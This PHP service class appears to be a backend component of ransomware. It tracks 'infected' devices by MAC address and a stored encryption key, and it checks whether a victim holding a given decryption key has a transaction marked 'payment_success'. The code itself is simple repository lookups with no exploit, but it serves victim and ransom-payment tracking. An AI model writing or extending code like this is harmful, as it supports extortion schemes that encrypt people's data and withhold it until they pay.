<?php

namespace App\Service\API;

use App\Repository\TransactionRepository;
use App\Repository\UserRepository;

class UserService {
    /**
     * @var UserRepository
     */
    private UserRepository $userRepository;

    /**
     * @var TransactionRepository
     */
    private TransactionRepository $transactionRepository;

    public function __construct(UserRepository $userRepository, TransactionRepository $transactionRepository)
    {
        $this->userRepository = $userRepository;
        $this->transactionRepository = $transactionRepository;
    }

    /**
     * Check if device is infected
     * @param string $macAddress
     * @return bool
     */
    public function isInfected(string $macAddress): bool {
        $user = $this->userRepository->findOneBy(['macAddress' => $macAddress]);
        if (!$user) {
            return false;    
        }
        if ($user->getEncryptionKey() !== null) {
            return true;
        }
        return false;
    }

    public function isPaied(string $decryptKey): bool {
        $user = $this->userRepository->findOneBy(['encryptionKey' => $decryptKey]);
        if (!$user) {
            return false;
        }
        $transaction = $this->transactionRepository->findOneBy(['user' => $user]);
        if (!$transaction) {
            return false;
        }
        if ($transaction->getPaymentStatus() === 'payment_success') {
            return true;
        } else {
            return false;
        }
    }
}
